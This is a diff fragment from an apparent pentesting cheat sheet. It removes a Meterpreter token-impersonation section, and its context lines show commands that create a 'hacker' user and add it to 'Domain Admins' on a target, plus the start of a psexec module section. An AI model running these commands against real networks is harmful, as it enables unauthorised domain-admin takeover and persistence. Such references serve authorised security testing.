@@ -239,19 +239,6 @@ add_user hacker password -h <target IP>
 add_group_user "Domain Admins" hacker -h <target IP>
 ------------------------------------------------------------------------------------------------------
 
-# Meterpreter - Impersonate User Account
-
-use incognito
-list_tokens -u
-impersonate_token <token>
-getuid
-shell
-
-C:\ whoami
-C:\ net user hacker password /add /domain
-C:\ net group "Domain Admins" hacker /add /domain
-------------------------------------------------------------------------------------------------------
-
 # psexec
 
 use windows/smb/psexec
